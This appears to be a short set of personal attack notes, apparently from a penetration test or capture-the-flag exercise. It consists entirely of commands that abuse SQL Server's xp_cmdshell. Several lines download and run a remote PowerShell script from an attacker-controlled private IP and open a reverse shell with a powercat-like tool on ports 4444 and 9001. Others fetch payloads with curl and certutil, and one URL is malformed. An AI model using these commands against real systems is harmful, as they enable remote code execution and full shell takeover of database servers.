xp_cmdshell powershell "iex(new-object net.webclient).downloadstring(\"http://192.168.69.3:8000/mitren.ps1\");powerrcatt -c 192.168.69.3 -p 4444 -e cmd"




xp_cmdshell "dir C:\Temp"


xp_cmdshell "curl http://192.168.69.3:8000/mitren.ps1 -o C:\Temp\mitren.ps1"


certutil -urlcache -f http://192.168.69.3:8000/rev.exe rev.exe
xp_cmdshell "certutil -urlcache -f http://http://192.168.69.3:8000/mitren.ps1 C:\Temp\mitren.ps1"

xp_cmdshell powershell "powerrcatt -c 192.168.69.3 -p 4444 -e cmd"




xp_cmdshell powershell "iex(new-object net.webclient).downloadstring(\"http://192.168.18.19/mitren.ps1\");powerrcatt -c 192.168.18.19 -p 9001 -e cmd"


xp_cmdshell powershell "iex(new-object net.webclient).downloadstring(\"http://192.168.69.3/mitren.ps1\");powerrcatt -c 192.168.69.3 -p 4444 -e cmd"